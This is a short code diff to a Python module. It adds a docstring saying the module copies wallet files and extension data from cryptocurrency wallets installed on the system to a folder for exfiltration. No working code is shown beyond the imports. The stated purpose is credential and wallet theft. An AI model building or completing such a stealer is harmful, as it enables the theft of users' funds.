@@ -1,4 +1,5 @@
-from operator import truediv
+"""This module is responsible for extracting wallet data from various cryptocurrency wallets installed on the system. It defines paths to known wallet locations and provides functionality to copy wallet files and extension data to a specified folder for exfiltration."""
+
 import shutil
 import os
 
